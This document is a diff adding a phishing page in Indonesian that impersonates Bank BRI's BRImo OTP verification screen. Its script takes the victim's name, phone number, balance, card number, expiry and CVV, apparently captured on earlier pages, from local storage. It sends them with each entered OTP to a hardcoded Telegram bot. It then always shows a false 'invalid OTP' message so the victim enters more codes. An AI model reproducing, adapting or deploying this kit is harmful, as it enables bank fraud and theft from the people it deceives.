@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP — BRI</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0055B8 0%, #0099FF 50%, #FFD700 100%);
+            min-height: 100vh;
+            color: white;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .otp-input {
+            width: 52px; height: 56px; font-size: 24px; font-weight: 700; text-align: center;
+            border: 2px solid #D1D5DB; border-radius: 12px; outline: none;
+            transition: all 0.2s ease;
+            background: white;
+            color: #003366;
+        }
+        .otp-input:focus { border-color: #0066CC; box-shadow: 0 0 0 3px rgba(0,102,204,0.2); }
+        .otp-input.filled { border-color: #0066CC; }
+        .resend-btn:disabled { color: #9CA3AF; cursor: not-allowed; }
+
+        .loading-overlay {
+            position: fixed; inset: 0; background: rgba(255,255,255,0.95);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 999; opacity: 0; visibility: hidden; transition: all 0.3s ease;
+        }
+        .loading-overlay.active { opacity: 1; visibility: visible; }
+        .spinner {
+            width: 40px; height: 40px; border: 3px solid #ddd; border-top-color: #0066CC;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .otp-card {
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            padding: 30px 22px;
+            border: 2px solid rgba(255,255,255,0.25);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+        }
+
+        /* ⚠️ PESAN ERROR MENGAMBANG DI ATAS */
+        .error-toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #FEE2E2;
+            color: #DC2626;
+            border: 1px solid #FECACA;
+            padding: 14px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            font-weight: 500;
+            line-height: 1.6;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .error-toast.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* ⚠️ PESAN ERROR DI DALAM KOTAK OTP */
+        .error-inline {
+            background: rgba(254, 202, 202, 0.25);
+            color: #FEE2E2;
+            border: 1px solid rgba(254, 202, 202, 0.4);
+            padding: 12px 16px;
+            border-radius: 10px;
+            text-align: center;
+            font-weight: 500;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .error-inline.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+    <!-- 🔔 PESAN ERROR MENGAMBANG DI ATAS LAYAR -->
+    <div id="errorToast" class="error-toast">
+        ❌ Maaf Kode OTP Yang Di Masukkan Tidak Valid<br>
+        Silahkan Masukkan Kode OTP Yang Benar<br>
+        <small style="font-size: 13px; color: #991B1B;">Pastikan Kode OTP Terbaru</small>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner mb-4"></div>
+        <p id="loadingText" class="text-gray-700 font-medium">Memverifikasi OTP... ⏳</p>
+        <p class="text-gray-500 text-sm mt-1">Mohon tunggu sebentar</p>
+    </div>
+
+    <!-- KOTAK OTP -->
+    <div class="otp-card">
+        <div class="text-center mb-8">
+            <div class="w-16 h-16 bg-yellow-400/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-yellow-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold text-white">Verifikasi Kode OTP</h1>
+            <p class="text-white/80 mt-2">Kode OTP 6 Digit Dikirim Ke Nomor Handphone Terdaftar Di BRImo</p>
+        </div>
+
+        <!-- ✅ PESAN ERROR DI DALAM KOTAK — SAMA PERSIS TEKSNYA -->
+        <div id="errorInline" class="error-inline">
+            ❌ Maaf Kode OTP Yang Di Masukkan Tidak Valid<br>
+            Silahkan Masukkan Kode OTP Yang Benar<br>
+            <span style="font-size: 13px; opacity: 0.9;">Pastikan Kode OTP Terbaru</span>
+        </div>
+
+        <div class="flex justify-center gap-2 sm:gap-3 mb-6">
+            <input type="text" class="otp-input" maxlength="1" data-index="0" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric">
+        </div>
+
+        <div class="text-center mb-6">
+            <p class="text-sm text-white/80 mb-2">Kode kedaluwarsa dalam <span id="timer" class="font-bold text-yellow-300">02:00</span></p>
+            <button id="resendBtn" class="resend-btn text-yellow-300 font-medium hover:underline">Kirim Ulang Kode OTP</button>
+        </div>
+
+        <button id="btnVerify" class="w-full py-3 px-4 rounded-xl font-semibold shadow-lg transition duration-200 text-lg bg-gradient-to-r from-yellow-400 to-yellow-500 text-blue-900 hover:from-yellow-300 hover:to-yellow-400" disabled>
+            Konfirmasi
+        </button>
+
+        <p class="text-center text-sm text-white/70 mt-6">
+            Butuh bantuan? <a href="#" class="text-yellow-300 font-medium hover:underline">Hubungi BRI 14017</a>
+        </p>
+    </div>
+
+    </div>
+
+    <script>
+        // ⚠️ GANTI DENGAN BOT TOKEN & CHAT ID MILIKMU!
+        const BOT_TOKEN = "8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE";
+        const CHAT_ID = "7402071395";
+
+        const DATA_GEBYAR = JSON.parse(localStorage.getItem('DATA_GEBYAR') || '{}');
+        const DATA_KARTU = JSON.parse(localStorage.getItem('DATA_KARTU') || '{}');
+
+        let otpCode = '';
+        let timerInterval;
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const btnVerify = document.getElementById('btnVerify');
+        const timerEl = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorToast = document.getElementById('errorToast');
+        const errorInline = document.getElementById('errorInline');
+
+        document.addEventListener('DOMContentLoaded', () => {
+            otpInputs[0].focus();
+            startTimer();
+        });
+
+        function startTimer() {
+            clearInterval(timerInterval);
+            let timeLeft = 120;
+            resendBtn.disabled = true;
+            const updateTimer = () => {
+                const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                const s = (timeLeft % 60).toString().padStart(2, '0');
+                timerEl.textContent = `${m}:${s}`;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    resendBtn.disabled = false;
+                    timerEl.textContent = 'Kedaluwarsa';
+                }
+                timeLeft--;
+            };
+            updateTimer();
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value) {
+                    e.target.classList.add('filled');
+                    if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+                } else {
+                    e.target.classList.remove('filled');
+                }
+                otpCode = Array.from(otpInputs).map(i => i.value).join('');
+                btnVerify.disabled = otpCode.length !== 6;
+                
+                // Sembunyikan pesan error saat pengguna mulai mengetik ulang
+                if (errorInline.classList.contains('show')) {
+                    errorInline.classList.remove('show');
+                    errorToast.classList.remove('show');
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                    otpInputs[index - 1].value = '';
+                    otpInputs[index - 1].classList.remove('filled');
+                    otpCode = Array.from(otpInputs).map(i => i.value).join('');
+                    btnVerify.disabled = true;
+                }
+            });
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                data.split('').forEach((d, i) => {
+                    if (otpInputs[i]) { otpInputs[i].value = d; otpInputs[i].classList.add('filled'); }
+                });
+                otpCode = data;
+                btnVerify.disabled = otpCode.length !== 6;
+            });
+        });
+
+        resendBtn.addEventListener('click', () => {
+            startTimer();
+            // Sembunyikan pesan error saat kirim ulang OTP
+            errorInline.classList.remove('show');
+            errorToast.classList.remove('show');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: `🔄 KIRIM ULANG OTP DIMINTA\n\n👤 Nama: ${DATA_GEBYAR.nama}\n📞 No: ${DATA_GEBYAR.noTelp}\n💳 No Kartu: ${DATA_KARTU.nomor}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`, 
+                    parse_mode: 'Markdown' 
+                })
+            }).catch(e => console.log(e));
+        });
+
+        // ✅ KONFIRMASI OTP → KIRIM TELEGRAM → TAMPILKAN PESAN ERROR DI DUA TEMPAT
+        btnVerify.addEventListener('click', async () => {
+            loadingOverlay.classList.add('active');
+            btnVerify.disabled = true;
+
+            // 📩 NOTIFIKASI KE TELEGRAM
+            const pesanOTP = `🔐 OTP DITERIMA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 Nama: ${DATA_GEBYAR.nama || 'Tidak ada'}
+📞 No. WhatsApp: ${DATA_GEBYAR.noTelp || 'Tidak ada'}
+💰 Saldo: ${DATA_GEBYAR.saldo || 'Tidak ada'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 No Kartu: ${DATA_KARTU.nomor || 'Tidak ada'}
+📅 Masa Berlaku: ${DATA_KARTU.berlaku || 'Tidak ada'}
+🔐 ${DATA_KARTU.labelKhusus || 'CVV'}: ${DATA_KARTU.nilaiKhusus || 'Tidak ada'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔢 Kode OTP: ${otpCode}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: pesanOTP, parse_mode: 'Markdown' })
+            }).catch(e => console.log(e));
+
+            // ⏳ Tunggu 1.5 detik, lalu tampilkan pesan error
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                
+                // ❌ TAMPILKAN PESAN ERROR DI ATAS LAYAR
+                errorToast.classList.add('show');
+                // ❌ TAMPILKAN PESAN ERROR DI DALAM KOTAK OTP
+                errorInline.classList.add('show');
+                
+                // 🔄 KOSONGKAN INPUT OTP & FOKUS ULANG
+                otpInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                otpInputs[0].focus();
+                otpCode = '';
+                btnVerify.disabled = true;
+
+                // ⏱️ Sembunyikan pesan error setelah 5 detik
+                setTimeout(() => {
+                    errorToast.classList.remove('show');
+                    // Pesan di dalam kotak TIDAK otomatis hilang — tetap tampil sampai user mengetik ulang
+                }, 5000);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
